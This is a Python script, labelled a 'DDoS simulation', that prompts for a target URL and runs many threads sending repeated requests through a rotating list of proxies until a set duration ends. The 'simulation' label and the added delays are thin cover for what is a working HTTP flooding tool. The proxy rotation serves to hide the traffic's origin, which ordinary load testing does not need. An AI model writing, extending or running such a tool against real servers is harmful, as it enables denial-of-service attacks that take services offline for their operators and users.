import requests
import threading
import time
import random

# User inputs
url = input("Enter the server URL (e.g., http://YOUR_SERVER_IP:YOUR_SERVER_PORT): ")
duration_seconds = int(input("Enter the duration of the simulation in seconds: "))
concurrent_threads = int(input("Enter the number of concurrent threads: "))

# List of proxy servers (format: http://IP:PORT)
proxy_list = [
    'http://proxy1.example.com:8080',
    'http://proxy2.example.com:8080',
    # Add more proxies as needed
]

# Function to test proxies
def test_proxy(proxy):
    try:
        response = requests.get(url, proxies={'http': proxy, 'https': proxy}, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

# Filter working proxies
working_proxies = [proxy for proxy in proxy_list if test_proxy(proxy)]

# Counter to keep track of the number of requests sent
request_counter = 0
lock = threading.Lock()

# Record the start time
start_time = time.time()

def send_request():
    global request_counter
    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time

        if elapsed_time >= duration_seconds:
            break

        if not working_proxies:
            print("No working proxies available.")
            break

        # Pick a random working proxy from the list
        proxy = random.choice(working_proxies)
        proxies = {
            'http': proxy,
            'https': proxy
        }

        with lock:
            request_counter += 1

        try:
            response = requests.get(url, proxies=proxies)
            print(f"Status Code: {response.status_code} - Proxy: {proxy}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e} - Proxy: {proxy}")

        # Optional: Add a short delay between requests to avoid overwhelming the server
        time.sleep(random.uniform(0.1, 0.5))

threads = []
for _ in range(concurrent_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("DDoS simulation completed.")
